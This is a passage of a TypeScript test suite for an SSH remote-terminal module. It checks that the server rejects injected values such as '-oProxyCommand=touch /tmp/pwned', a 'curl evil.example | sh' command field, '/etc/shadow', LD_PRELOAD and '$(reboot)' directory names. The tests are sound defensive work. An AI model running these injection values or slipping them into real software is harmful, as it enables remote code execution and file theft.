import { existsSync, readFileSync, readdirSync } from 'node:fs';
import { chmod, mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import {
  type CreatedApiToken,
  type Project,
  type RemoteHostList,
  type RemoteHostStatus,
  type TerminalCapability,
  type TerminalSession,
} from '@agent-studio/protocol';
import { afterEach, describe, expect, it } from 'vitest';
import type WebSocket from 'ws';
import { type ConfigOverrides, loadConfig } from '../../src/kernel/config.js';
import { type RemoteHostConfig, parseRemoteHostsFile } from '../../src/modules/remotes/hosts-file.js';
import type { ProbeSettings } from '../../src/modules/remotes/probe.js';
import { createRemotesModule } from '../../src/modules/remotes/remotes.module.js';
import { buildSshArgs, deriveSessionName, deriveUserTag, probeCommand, sessionCommand } from '../../src/modules/remotes/ssh-command.js';
import { findExecutable } from '../../src/modules/terminal/login-shell.js';
import { loadNativePty } from '../../src/modules/terminal/pty.js';
import { createTerminalModule } from '../../src/modules/terminal/terminal.module.js';
import {
  type AttachedTerminal,
  type TerminalConnection,
  attachTerminal,
  modulesWith,
  processIsRunning,
  waitUntil,
} from '../../src/modules/terminal/testing/terminal-client.js';
import { TEST_PASSWORD, type TestClient, type TestStudio, createTestStudio } from '../../src/testing/harness.js';

/**
 * No test here makes an SSH connection. The server finds, first on the PATH
 * it is given, a stand-in `ssh` program that writes down its arguments and
 * then plays the remote host with a local `sh`: its own home directory, its
 * own PATH of four basic tools, and a stand-in `tmux`. So the argument list,
 * the remote command and its quoting are exercised end to end, on this
 * machine only.
 */

const pty = await loadNativePty();
const live = describe.skipIf(!pty.available);
const liveTitle = (title: string) => (pty.available ? title : `${title} (SKIPPED: the pseudo-terminal library cannot load: ${pty.reason})`);

const TEST_SHELL = { file: '/bin/sh', args: [] } as const;
const FAST = { terminateGraceMs: 400, killWaitMs: 800 } as const;

const FAKE_SSH = `#!${process.execPath}
'use strict';
const fs = require('node:fs');
const path = require('node:path');
const { spawn } = require('node:child_process');
const world = path.dirname(__dirname);
const args = process.argv.slice(2);
fs.appendFileSync(path.join(__dirname, 'ssh.log'), JSON.stringify(args) + '\\n');
let behaviour = {};
try {
  behaviour = JSON.parse(fs.readFileSync(path.join(__dirname, 'behaviour.json'), 'utf8'));
} catch {}
const split = args.indexOf('--');
const rule = behaviour[args[split + 1]] || {};
if (rule.hang) {
  setInterval(() => {}, 1000);
} else if (rule.stderr !== undefined) {
  process.stderr.write(rule.stderr + '\\n');
  process.exit(rule.exit === undefined ? 255 : rule.exit);
} else {
  // The "remote host": the command the server sent, run by a shell that sees only the pretend account.
  const home = path.join(world, 'remote-home');
  const env = { HOME: home, PATH: path.join(world, 'remote-bin'), TERM: process.env.TERM || 'dumb' };
  const child = spawn('/bin/sh', ['-c', args[split + 2]], { stdio: 'inherit', cwd: home, env });
  child.on('exit', (code, signal) => process.exit(signal ? 255 : code));
}
`;

/** Writes down how it was called, then becomes the session's shell. */
const FAKE_TMUX = `#!/bin/sh
{ printf 'cwd=%s\\n' "$PWD"; for value in "$@"; do printf 'arg=%s\\n' "$value"; done; printf 'end\\n'; } >> "$HOME/tmux.log"
printf 'attached-to-pretend-tmux\\n'
exec sh
`;

interface World {
  readonly root: string;
  readonly ssh: string;
  readonly key: string;
  /** A directory that exists on the pretend remote host. */
  readonly remoteWork: string;
  /** Every invocation of the stand-in SSH client so far: its argument lists. */
  calls(): string[][];
  behave(rules: Record<string, { stderr?: string; exit?: number; hang?: boolean }>): Promise<void>;
  remoteTool(name: string, body?: string): Promise<void>;
  tmuxLog(): string[][];
}

async function createWorld(): Promise<World> {
  const root = await mkdtemp(path.join(os.tmpdir(), 'agent-studio-remote-world-'));
  const bin = path.join(root, 'bin');
  const remoteHome = path.join(root, 'remote-home');
  const remoteLocalBin = path.join(remoteHome, '.local', 'bin');
  const remoteWork = path.join(remoteHome, 'work', 'app');
  for (const directory of [bin, remoteLocalBin, remoteWork, path.join(root, 'remote-bin'), path.join(root, 'keys')]) await mkdir(directory, { recursive: true });
  await writeFile(path.join(bin, 'ssh'), FAKE_SSH, { mode: 0o755 });
  await writeFile(path.join(remoteLocalBin, 'tmux'), FAKE_TMUX, { mode: 0o755 });
  await writeFile(path.join(remoteLocalBin, 'git'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  for (const tool of ['sh', 'mkdir', 'chmod', 'env']) await symlink(findExecutable(tool, '/usr/bin:/bin')!, path.join(root, 'remote-bin', tool));
  const key = path.join(root, 'keys', 'id_test');
  await writeFile(key, 'not a real key\n', { mode: 0o600 });

  const log = path.join(bin, 'ssh.log');
  return {
    root,
    ssh: path.join(bin, 'ssh'),
    key,
    remoteWork,
    calls: () => (existsSync(log) ? readFileSync(log, 'utf8').trim().split('\n').filter(Boolean).map((line) => JSON.parse(line) as string[]) : []),
    behave: (rules) => writeFile(path.join(bin, 'behaviour.json'), JSON.stringify(rules)),
    remoteTool: (name, body = 'exit 0') => writeFile(path.join(remoteLocalBin, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 }),
    tmuxLog: () => {
      const file = path.join(remoteHome, 'tmux.log');
      if (!existsSync(file)) return [];
      return readFileSync(file, 'utf8')
        .split('end\n')
        .map((block) => block.trim().split('\n').filter(Boolean))
        .filter((block) => block.length > 0);
    },
  };
}

const HOSTS = (world: World) => ({
  hosts: [
    { id: 'build-box', name: 'Build box', hostname: 'build.internal.example', user: 'dev', defaultDirectory: world.remoteWork },
    { id: 'bastion', name: 'Bastion', hostname: 'bastion.example', port: 2200, identityFile: world.key },
    { id: 'inner', name: 'Inner', hostname: '10.20.0.5', jumpHost: 'bastion', agents: true, hostKeyChecking: 'accept-new' },
    { id: 'down', name: 'Down', hostname: 'down.example' },
    { id: 'slow', name: 'Slow', hostname: 'slow.example' },
  ],
});

interface Bench {
  readonly t: TestStudio;
  readonly world: World;
  readonly owner: TestClient;
  readonly project: Project;
  readonly hostsFile: string;
  readonly wsUrl: string;
  readonly origin: string;
  writeHosts(content: unknown, mode?: number): Promise<void>;
  /** The configured hosts as the server understands them. */
  configured(): Map<string, RemoteHostConfig>;
  open(body: Record<string, unknown>, as?: TestClient): Promise<{ session: TerminalSession; terminal: AttachedTerminal; pid: number }>;
}

const benches: Bench[] = [];
const sockets: WebSocket[] = [];
const startedPids: number[] = [];

async function start(options: { hosts?: unknown | null; probe?: Partial<ProbeSettings>; config?: ConfigOverrides; world?: World } = {}): Promise<Bench> {
  const world = options.world ?? (await createWorld());
  const t = await createTestStudio({
    modules: modulesWith(
      createTerminalModule({ shell: TEST_SHELL, limits: FAST }),
      createRemotesModule({ pathPrepend: [path.dirname(world.ssh)], ...(options.probe ? { probe: options.probe } : {}) }),
    ),
    ...(options.config ? { config: options.config } : {}),
  });
  const address = await t.listen();
  const owner = await t.owner();
  const created = await owner.post<Project>('/api/projects', { name: 'demo', rootDir: path.join(t.workspace, 'demo'), createDirectory: true });
  expect(created.status).toBe(201);
  const hostsFile = options.config?.remoteHostsFile ?? path.join(t.dataDir, 'remote-hosts.json');
  let current: unknown = null;

  const bench: Bench = {
    t,
    world,
    owner,
    project: created.body,
    hostsFile,
    wsUrl: address.wsUrl,
    origin: address.url,
    async writeHosts(content, mode = 0o600) {
      current = content;
      await writeFile(hostsFile, typeof content === 'string' ? content : JSON.stringify(content, null, 2), { mode });
      await chmod(hostsFile, mode);
    },
    configured: () => new Map(parseRemoteHostsFile(JSON.stringify(current)).map((host) => [host.id, host])),
    async open(body, as = owner) {
      const response = await as.post<TerminalSession>('/api/terminal/sessions', { projectId: created.body.id, ...body });
      expect(response.body, JSON.stringify(response.body)).toMatchObject({ alive: true });
      expect(response.status).toBe(201);
      const pid = t.studio.context.services.terminal.processIdOf(as.userId!, response.body.id)!;
      startedPids.push(pid);
      const terminal = await attachTerminal({ wsUrl: address.wsUrl, origin: address.url, client: as, sessionId: response.body.id });
      sockets.push(terminal.socket);
      return { session: response.body, terminal, pid };
    },
  };
  if (options.hosts !== null) await bench.writeHosts(options.hosts ?? HOSTS(world));
  benches.push(bench);
  return bench;
}

afterEach(async () => {
  for (const socket of sockets.splice(0)) socket.terminate();
  for (const bench of benches.splice(0)) {
    await bench.t.close();
    await rm(bench.world.root, { recursive: true, force: true });
  }
  const pids = startedPids.splice(0);
  await waitUntil(() => pids.every((pid) => !processIsRunning(pid)), 3000, 'every stand-in SSH client to be gone').catch(() => {});
  expect(pids.filter(processIsRunning), 'processes left running after the server stopped').toEqual([]);
});

/** Whether a tool the pretend host does not provide exists in a directory the remote script also searches on this machine. */
const systemWide = (tool: string) => ['/usr/local/bin', '/opt/homebrew/bin'].some((directory) => existsSync(path.join(directory, tool)));

async function run(terminal: TerminalConnection, command: string): Promise<string> {
  const from = terminal.mark();
  terminal.type(`printf '<%s>' be"gin"; ${command}; printf '<%s>\\n' e"nd"\r`);
  await terminal.expectOutput('<begin>');
  await terminal.expectOutput('<end>');
  const text = terminal.text();
  const begin = text.indexOf('<begin>', from) + '<begin>'.length;
  return text.slice(begin, text.indexOf('<end>', begin)).replaceAll('\r\n', '\n').trim();
}

function childrenOf(pid: number): number[] {
  return readdirSync('/proc')
    .filter((name) => /^\d+$/.test(name))
    .filter((name) => {
      try {
        const stat = readFileSync(`/proc/${name}/stat`, 'utf8');
        const fields = stat.slice(stat.lastIndexOf(')') + 2).split(' ');
        return fields[0] !== 'Z' && Number(fields[1]) === pid;
      } catch {
        return false;
      }
    })
    .map(Number);
}

const statusOf = (client: TestClient, hostId: string, query = '') => client.get<RemoteHostStatus>(`/api/remotes/hosts/${hostId}/status${query}`);

// ─────────────────────────────────────────────────────────────────────────────

describe('the list of remote hosts', () => {
  it('is empty, and says where hosts come from, when the operator has configured none', async () => {
    const bench = await start({ hosts: null });
    const list = await bench.owner.get<RemoteHostList>('/api/remotes/hosts');
    expect(list.status).toBe(200);
    expect(list.body).toEqual({ hosts: [], configuration: { status: 'missing', message: null, file: path.join(bench.t.dataDir, 'remote-hosts.json') } });
    expect(list.headers['cache-control']).toBe('no-store');
    expect((await statusOf(bench.owner, 'build-box')).status).toBe(404);
    expect(bench.world.calls()).toEqual([]);
  });

  it('shows exactly the configured hosts, and nothing about their keys', async () => {
    const bench = await start();
    const list = await bench.owner.get<RemoteHostList>('/api/remotes/hosts');
    expect(list.body.configuration).toEqual({ status: 'ok', message: null, file: bench.hostsFile });
    expect(list.body.hosts).toEqual([
      { id: 'build-box', name: 'Build box', target: 'dev@build.internal.example', viaHostId: null, defaultDirectory: bench.world.remoteWork, agentsAllowed: false },
      { id: 'bastion', name: 'Bastion', target: 'bastion.example:2200', viaHostId: null, defaultDirectory: null, agentsAllowed: false },
      { id: 'inner', name: 'Inner', target: '10.20.0.5', viaHostId: 'bastion', defaultDirectory: null, agentsAllowed: true },
      { id: 'down', name: 'Down', target: 'down.example', viaHostId: null, defaultDirectory: null, agentsAllowed: false },
      { id: 'slow', name: 'Slow', target: 'slow.example', viaHostId: null, defaultDirectory: null, agentsAllowed: false },
    ]);
    expect(JSON.stringify(list.body)).not.toContain('id_test');
    // Listing connects to nothing.
    expect(bench.world.calls()).toEqual([]);
  });

  it('follows the file as the operator edits it, without a restart', async () => {
    const bench = await start();
    const ids = async () => (await bench.owner.get<RemoteHostList>('/api/remotes/hosts')).body.hosts.map((host) => host.id);
    expect(await ids()).toEqual(['build-box', 'bastion', 'inner', 'down', 'slow']);

    await bench.writeHosts({ hosts: [{ id: 'only-one', name: 'Only one', hostname: 'one.example', port: 2222, user: 'ops' }] });
    const list = await bench.owner.get<RemoteHostList>('/api/remotes/hosts');
    expect(list.body.hosts).toEqual([{ id: 'only-one', name: 'Only one', target: 'ops@one.example:2222', viaHostId: null, defaultDirectory: null, agentsAllowed: false }]);
    // A host that was removed is gone for every purpose.
    expect((await statusOf(bench.owner, 'build-box')).status).toBe(404);

    // One bad field rejects the whole file: no host is offered until it is fixed.
    await bench.writeHosts({ hosts: [{ id: 'only-one', name: 'Only one', hostname: 'one.example' }, { id: 'bad', name: 'Bad', hostname: '-oProxyCommand=touch /tmp/pwned' }] });
    const rejected = await bench.owner.get<RemoteHostList>('/api/remotes/hosts');
    expect(rejected.body).toEqual({
      hosts: [],
      configuration: { status: 'invalid', message: 'hosts[1].hostname: must be a DNS name or an IP address', file: bench.hostsFile },
    });
    const refused = await statusOf(bench.owner, 'only-one');
    expect(refused.status).toBe(503);
    expect(refused.body).toMatchObject({ error: { code: 'remote_hosts_invalid', details: { problem: 'hosts[1].hostname: must be a DNS name or an IP address' } } });
    expect(JSON.stringify(refused.body)).not.toContain('pwned');

    await bench.writeHosts({ hosts: [{ id: 'only-one', name: 'Only one', hostname: 'one.example' }] });
    expect(await ids()).toEqual(['only-one']);
    await rm(bench.hostsFile);
    expect((await bench.owner.get<RemoteHostList>('/api/remotes/hosts')).body.configuration.status).toBe('missing');
    expect(bench.world.calls()).toEqual([]);
  });

  it.runIf(process.platform !== 'win32')('ignores a file that other accounts could have written', async () => {
    const bench = await start({ hosts: null });
    await bench.writeHosts(HOSTS(bench.world), 0o666);
    expect((await bench.owner.get<RemoteHostList>('/api/remotes/hosts')).body).toMatchObject({
      hosts: [],
      configuration: { status: 'invalid', message: 'the file must not be writable by group or others (chmod 600)' },
    });
  });

  it('reads the file the operator points to', async () => {
    const world = await createWorld();
    const custom = path.join(world.root, 'my-hosts.json');
    const bench = await start({ world, hosts: null, config: { remoteHostsFile: custom } });
    await bench.writeHosts({ hosts: [{ id: 'elsewhere', name: 'Elsewhere', hostname: 'else.example' }] });
    const list = await bench.owner.get<RemoteHostList>('/api/remotes/hosts');
    expect(list.body.configuration).toEqual({ status: 'ok', message: null, file: custom });
    expect(list.body.hosts.map((host) => host.id)).toEqual(['elsewhere']);
    expect(existsSync(path.join(bench.t.dataDir, 'remote-hosts.json'))).toBe(false);

    // The setting itself: unset means the default inside the data directory.
    expect(loadConfig({}).remoteHostsFile).toBeNull();
    expect(loadConfig({ AGENT_STUDIO_REMOTE_HOSTS_FILE: '/etc/studio/hosts.json' }).remoteHostsFile).toBe('/etc/studio/hosts.json');
    expect(loadConfig({ AGENT_STUDIO_REMOTE_HOSTS_FILE: '~/hosts.json' }).remoteHostsFile).toBe(path.join(os.homedir(), 'hosts.json'));
  });

  it('is for the owner, and read-only', async () => {
    const bench = await start();
    const member = await bench.t.member();
    for (const url of ['/api/remotes/hosts', '/api/remotes/hosts/build-box/status']) {
      expect((await bench.t.anonymous().get(url)).status, url).toBe(401);
      expect((await member.get(url)).body, url).toMatchObject({ error: { code: 'owner_required' } });
    }
    const reader = await bench.owner.post<CreatedApiToken>('/api/auth/tokens', { name: 'reader', scopes: ['read'] });
    const robot = bench.t.anonymous();
    robot.bearer = reader.body.token;
    expect((await robot.get('/api/remotes/hosts')).body).toMatchObject({ error: { code: 'insufficient_scope' } });

    // There is nothing to write to: hosts cannot be added, changed or removed over the API.
    for (const [method, url] of [
      ['POST', '/api/remotes/hosts'],
      ['PUT', '/api/remotes/hosts/build-box'],
      ['PATCH', '/api/remotes/hosts/build-box'],
      ['DELETE', '/api/remotes/hosts/build-box'],
      ['POST', '/api/remotes/hosts/build-box/status'],
    ] as const) {
      const response = await bench.owner.request(method, url, { id: 'evil', name: 'Evil', hostname: 'evil.example' });
      expect(response.status, `${method} ${url}`).toBe(404);
    }
    expect((await bench.owner.get<RemoteHostList>('/api/remotes/hosts')).body.hosts).toHaveLength(5);
    expect(bench.world.calls()).toEqual([]);
  });
});

describe('the status of a remote host', () => {
  it('reports a host that answers: how fast, and which tools it has', async () => {
    const bench = await start();
    const status = await statusOf(bench.owner, 'build-box');
    expect(status.status).toBe(200);
    expect(status.body).toMatchObject({
      hostId: 'build-box',
      reachable: true,
      tools: { tmux: true, git: true, claude: systemWide('claude'), codex: systemWide('codex') },
      failure: null,
      cached: false,
    });
    expect(status.body.latencyMs).toBeGreaterThanOrEqual(0);
    expect(status.body.checkedAt).toBeLessThanOrEqual(Date.now());

    // One connection, with exactly the arguments the configuration implies.
    const host = bench.configured().get('build-box')!;
    expect(bench.world.calls()).toEqual([
      buildSshArgs({ mode: 'probe', host, jump: null, remoteCommand: probeCommand(), connectTimeoutSeconds: 6, sshProgram: bench.world.ssh }),
    ]);

    // Asking again, even with a re-check, does not connect again so soon.
    expect((await statusOf(bench.owner, 'build-box')).body).toEqual({ ...status.body, cached: true });
    expect((await statusOf(bench.owner, 'build-box', '?refresh=1')).body.cached).toBe(true);
    expect(bench.world.calls()).toHaveLength(1);

    // A tool that appears on the host shows up at the next real check.
    await bench.world.remoteTool('claude');
    const again = await start({ world: bench.world, probe: { minIntervalMs: 1 } });
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect((await statusOf(again.owner, 'build-box', '?refresh=true')).body).toMatchObject({ cached: false, tools: { tmux: true, git: true, claude: true } });
  });

  it('goes through the jump host with the configured key', async () => {
    const bench = await start();
    expect((await statusOf(bench.owner, 'inner')).body).toMatchObject({ reachable: true, cached: false });
    const hosts = bench.configured();
    const [args] = bench.world.calls();
    expect(args).toEqual(
      buildSshArgs({ mode: 'probe', host: hosts.get('inner')!, jump: hosts.get('bastion')!, remoteCommand: probeCommand(), connectTimeoutSeconds: 6, sshProgram: bench.world.ssh }),
    );
    const proxy = args!.find((arg) => arg.startsWith('ProxyCommand='))!;
    expect(proxy).toContain(`${bench.world.ssh} -F none -o BatchMode=yes`);
    expect(proxy).toContain(`-i ${bench.world.key} -p 2200 -W '[%h]:%p' -- bastion.example`);
    expect(args).toContain('StrictHostKeyChecking=accept-new');
  });

  it('answers "not found" for an unknown host without connecting anywhere', async () => {
    const bench = await start();
    const unknown = await statusOf(bench.owner, 'not-configured');
    expect(unknown.status).toBe(404);
    expect(unknown.body).toMatchObject({ error: { code: 'remote_host_not_found' } });
    // Something that is not even an id never reaches the lookup.
    for (const id of ['-oProxyCommand=evil', 'UPPER', 'a b', 'evil.example', 'a'.repeat(33), '..%2f..']) {
      expect((await statusOf(bench.owner, encodeURIComponent(id))).status, id).toBe(400);
    }
    expect((await statusOf(bench.owner, 'build-box', '?refresh=maybe')).status).toBe(400);
    expect(bench.world.calls()).toEqual([]);
  });

  it('reports an unreachable host with a short reason, and does not try again at once', async () => {
    const bench = await start();
    await bench.world.behave({
      'down.example': { stderr: 'debug: trying\nssh: connect to host down.example port 22: Connection refused', exit: 255 },
      'build.internal.example': { stderr: 'dev@build.internal.example: Permission denied (publickey).', exit: 255 },
      '10.20.0.5': { stderr: '@@@@@@@@@@@@@@@@@@@@@\n@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @\n@@@@@@@@@@@@@@@@@@@@@\nHost key verification failed.', exit: 255 },
    });
    const down = await statusOf(bench.owner, 'down');
    expect(down.status).toBe(200);
    expect(down.body).toMatchObject({ reachable: false, latencyMs: null, tools: null, failure: { code: 'connection_refused', message: 'The connection was refused.' }, cached: false });
    expect((await statusOf(bench.owner, 'down')).body).toMatchObject({ reachable: false, cached: true });
    expect((await statusOf(bench.owner, 'build-box')).body.failure).toEqual({ code: 'auth_failed', message: 'Authentication failed: the host did not accept the key.' });
    const changed = (await statusOf(bench.owner, 'inner')).body;
    expect(changed.failure).toEqual({ code: 'host_key_failed', message: 'Host key verification failed: the host key is unknown or has changed.' });
    // Never the raw output.
    expect(JSON.stringify(changed)).not.toContain('@@@');
    expect(bench.world.calls()).toHaveLength(3);
  });

  it('gives up on a host that does not answer within the time limit', async () => {
    const bench = await start({ probe: { timeoutMs: 500 } });
    await bench.world.behave({ 'slow.example': { hang: true } });
    const started = Date.now();
    const slow = await statusOf(bench.owner, 'slow');
    expect(slow.body).toMatchObject({ reachable: false, failure: { code: 'timeout', message: 'The connection timed out.' } });
    expect(Date.now() - started).toBeLessThan(5000);
    // The stand-in client was stopped, not left waiting.
    expect(bench.t.studio.context.processes.running).toBe(0);
  });

  it('makes one connection for many simultaneous requests', async () => {
    const bench = await start();
    const answers = await Promise.all(Array.from({ length: 20 }, () => statusOf(bench.owner, 'build-box')));
    expect(answers.every((answer) => answer.status === 200 && answer.body.reachable)).toBe(true);
    expect(new Set(answers.map((answer) => answer.body.checkedAt)).size).toBe(1);
    expect(bench.world.calls()).toHaveLength(1);
  });

  it('says so when this computer has no SSH client, or the configured key cannot be read', async () => {
    const world = await createWorld();
    const bench = await start({ world, hosts: { hosts: [{ id: 'keyed', name: 'Keyed', hostname: 'keyed.example', identityFile: path.join(world.root, 'keys', 'absent') }, { id: 'plain', name: 'Plain', hostname: 'plain.example' }] } });
    expect((await statusOf(bench.owner, 'keyed')).body.failure).toEqual({ code: 'identity_unreadable', message: 'The key file configured for this host cannot be read.' });
    const noKey = await bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', remote: { hostId: 'keyed' } });
    expect(noKey.status).toBe(503);
    expect(noKey.body).toMatchObject({ error: { code: 'identity_unreadable' } });
    expect(world.calls()).toEqual([]);

    // Take the client away: remove the stand-in and leave a PATH that has none.
    await rm(world.ssh);
    const realPath = process.env.PATH;
    process.env.PATH = path.join(world.root, 'remote-bin');
    try {
      expect((await statusOf(bench.owner, 'plain')).body).toMatchObject({ reachable: false, failure: { code: 'ssh_missing', message: 'No SSH client is installed on this computer.' } });
      const capability = (await bench.owner.get<TerminalCapability>('/api/terminal/capability')).body;
      expect(capability.launchers.find((launcher) => launcher.key === 'remote-shell')).toMatchObject({ available: false, unavailableReason: 'No SSH client is installed on this computer.' });
      const refused = await bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', remote: { hostId: 'plain' } });
      expect(refused.status).toBe(503);
      expect(refused.body).toMatchObject({ error: { code: 'ssh_missing' } });
    } finally {
      process.env.PATH = realPath;
    }
    // Everything else still works.
    expect((await bench.owner.get<RemoteHostList>('/api/remotes/hosts')).body.hosts).toHaveLength(2);
  });
});

// ─────────────────────────────────────────────────────────────────────────────

live(liveTitle('a terminal session on a remote host'), () => {
  it('opens a shell in the requested directory, inside a tmux session named by the server', async () => {
    const bench = await start();
    const capability = (await bench.owner.get<TerminalCapability>('/api/terminal/capability')).body;
    for (const key of ['remote-shell', 'remote-claude', 'remote-codex']) {
      expect(capability.launchers.find((launcher) => launcher.key === key)).toMatchObject({ kind: 'remote', requiresProject: true, requiresRemote: true, available: true });
    }

    const directory = path.join(path.dirname(bench.world.remoteWork), 'other');
    await mkdir(directory);
    const { session, terminal, pid } = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box', directory } });
    expect(session).toMatchObject({ launcher: 'remote-shell', remoteHostId: 'build-box', directory, title: 'Build box: shell', projectId: bench.project.id });

    // The stand-in host ran the command it was sent: it is in that directory, inside "tmux".
    await terminal.expectOutput('attached-to-pretend-tmux');
    expect(await run(terminal, 'pwd')).toBe(directory);
    expect(await run(terminal, 'echo remote-$((6 * 7))')).toBe('remote-42');
    const name = deriveSessionName(bench.owner.userId!, 'shell', directory);
    expect(bench.world.tmuxLog()).toEqual([[`cwd=${directory}`, 'arg=new-session', 'arg=-A', 'arg=-s', `arg=${name}`]]);

    // The SSH client was started once, with exactly what the configuration and the request imply.
    const host = bench.configured().get('build-box')!;
    expect(bench.world.calls()).toEqual([
      buildSshArgs({
        mode: 'session',
        host,
        jump: null,
        remoteCommand: sessionCommand({ program: 'shell', directory, sessionName: name, userTag: deriveUserTag(bench.owner.userId!) }),
        connectTimeoutSeconds: 10,
        sshProgram: bench.world.ssh,
      }),
    ]);

    // Closing the terminal ends the client and everything under it.
    const processes = [pid, ...childrenOf(pid)];
    expect(processes.length).toBeGreaterThan(1);
    expect((await bench.owner.delete(`/api/terminal/sessions/${session.id}`)).body).toEqual({ closed: true, remainingProcesses: 0 });
    expect(processes.filter(processIsRunning)).toEqual([]);

    const audit = await bench.owner.get<{ events: Array<{ action: string; detail: string }> }>('/api/audit?category=change&limit=50');
    expect(audit.body.events.find((event) => event.action === 'terminal.session.created')?.detail).toBe(
      `launcher: remote-shell; project: ${bench.project.id}; remote host: build-box; remote directory: ${directory}`,
    );
  });

  it('returns to the same remote session, and keeps different work apart', async () => {
    const bench = await start();
    // No directory given: the host's configured one.
    const first = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box' } });
    expect(first.session.directory).toBe(bench.world.remoteWork);
    await first.terminal.expectOutput('attached-to-pretend-tmux');
    const again = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box', directory: bench.world.remoteWork } });
    await again.terminal.expectOutput('attached-to-pretend-tmux');
    // A host without a configured directory, and none requested: the remote home.
    const home = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'down' } });
    expect(home.session.directory).toBeNull();
    await home.terminal.expectOutput('attached-to-pretend-tmux');
    // Another owner on the same host and directory.
    expect((await bench.owner.post('/api/users', { username: 'second', password: TEST_PASSWORD, role: 'owner' })).status).toBe(201);
    const second = await bench.t.signIn('second');
    const theirs = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box' } }, second);
    await theirs.terminal.expectOutput('attached-to-pretend-tmux');

    const names = bench.world.tmuxLog().map((entry) => entry[entry.length - 1]!.slice('arg='.length));
    const mine = deriveSessionName(bench.owner.userId!, 'shell', bench.world.remoteWork);
    expect(names).toEqual([mine, mine, deriveSessionName(bench.owner.userId!, 'shell', null), deriveSessionName(second.userId!, 'shell', bench.world.remoteWork)]);
    expect(new Set(names).size).toBe(3);
    for (const name of names) expect(name).toMatch(/^studio-shell-[0-9a-f]{12}$/);
    expect(bench.world.tmuxLog()[2]![0]).toBe(`cwd=${path.join(bench.world.root, 'remote-home')}`);
  });

  it('starts an agent only where the operator allows it, with its own configuration directory', async () => {
    const bench = await start();
    await bench.world.remoteTool('claude');
    const refused = await bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-claude', remote: { hostId: 'build-box' } });
    expect(refused.status).toBe(403);
    expect(refused.body).toMatchObject({ error: { code: 'remote_agents_not_allowed' } });
    expect(bench.world.calls()).toEqual([]);

    const { session, terminal } = await bench.open({ launcher: 'remote-claude', remote: { hostId: 'inner', directory: bench.world.remoteWork } });
    expect(session).toMatchObject({ launcher: 'remote-claude', remoteHostId: 'inner', title: 'Inner: Claude Code' });
    await terminal.expectOutput('attached-to-pretend-tmux');
    const remoteHome = path.join(bench.world.root, 'remote-home');
    const config = path.join(remoteHome, '.agent-studio-remote', deriveUserTag(bench.owner.userId!), 'claude');
    expect(bench.world.tmuxLog()).toEqual([
      [
        `cwd=${bench.world.remoteWork}`,
        'arg=new-session',
        'arg=-A',
        'arg=-s',
        `arg=${deriveSessionName(bench.owner.userId!, 'claude', bench.world.remoteWork)}`,
        'arg=env',
        `arg=CLAUDE_CONFIG_DIR=${config}`,
        `arg=${path.join(remoteHome, '.local', 'bin', 'claude')}`,
      ],
    ]);
    expect(existsSync(config)).toBe(true);
    expect(existsSync(path.join(remoteHome, '.claude'))).toBe(false);

    // An agent that is not installed there: the message appears in the terminal and the session ends.
    if (systemWide('codex')) return; // this machine would lend the pretend host a real one
    const missing = await bench.open({ launcher: 'remote-codex', remote: { hostId: 'inner' } });
    await missing.terminal.expectOutput('agent-studio: codex is not installed on this host');
    expect(await missing.terminal.next('exit')).toMatchObject({ exitCode: 127, reason: 'exited' });
  });

  it('shows why a connection failed, in the terminal, and ends the session', async () => {
    const bench = await start();
    await bench.world.behave({ 'down.example': { stderr: 'ssh: connect to host down.example port 22: Connection refused', exit: 255 } });
    const { terminal, session } = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'down' } });
    await terminal.expectOutput('Connection refused');
    expect(await terminal.next('exit')).toMatchObject({ exitCode: 255, reason: 'exited' });
    expect((await bench.owner.get<TerminalSession>(`/api/terminal/sessions/${session.id}`)).body).toMatchObject({ alive: false, exitCode: 255 });

    // A directory that does not exist on the host.
    const absent = await bench.open({ launcher: 'remote-shell', remote: { hostId: 'build-box', directory: '/no/such/place' } });
    await absent.terminal.expectOutput('agent-studio: cannot open the directory /no/such/place on this host');
    expect(await absent.terminal.next('exit')).toMatchObject({ exitCode: 66 });
  });

  it('lets a client choose a configured host and a directory, and nothing else', async () => {
    const bench = await start();
    const post = (body: Record<string, unknown>) => bench.owner.post('/api/terminal/sessions', { projectId: bench.project.id, launcher: 'remote-shell', ...body });

    // Hosts: only an id of a configured host.
    expect((await post({ remote: { hostId: 'not-configured' } })).body).toMatchObject({ error: { code: 'remote_host_not_found' } });
    for (const hostId of ['evil.example', 'root@build.internal.example', '-oProxyCommand=evil', 'BUILD-BOX', 'build box', '', 7, null]) {
      expect((await post({ remote: { hostId } })).status, JSON.stringify(hostId)).toBe(400);
    }
    expect((await post({})).body).toMatchObject({ error: { code: 'remote_required' } });
    expect((await post({ remote: {} })).status).toBe(400);

    // No field for a host name, a user, a port, a key, a command or an option — at any level.
    for (const extra of [
      { hostname: 'evil.example' },
      { host: 'evil.example' },
      { user: 'root' },
      { port: 2222 },
      { identityFile: '/etc/shadow' },
      { command: 'curl evil.example | sh' },
      { options: ['-oProxyCommand=evil'] },
      { jumpHost: 'evil.example' },
      { program: 'bash' },
      { sessionName: 'mine' },
      { env: { LD_PRELOAD: '/tmp/x.so' } },
    ]) {
      expect((await post({ remote: { hostId: 'build-box', ...extra } })).status, JSON.stringify(extra)).toBe(400);
      expect((await post({ remote: { hostId: 'build-box' }, ...extra })).status, JSON.stringify(extra)).toBe(400);
    }

    // Directories: an absolute path of plain segments, or nothing.
    for (const directory of [
      'relative/path',
      '~/work',
      '/srv/my work',
      '/srv/work;reboot',
      "/srv/it's",
      '/srv/"quoted"',
      '/srv/$(reboot)',
      '/srv/`reboot`',
      '/srv/$HOME',
      '/srv/../etc',
      '/srv/./x',
      '/srv//x',
      '/srv/-rf',
      '-oProxyCommand=evil',
      '--help',
      '/srv/work\nreboot',
      '/srv/work\r',
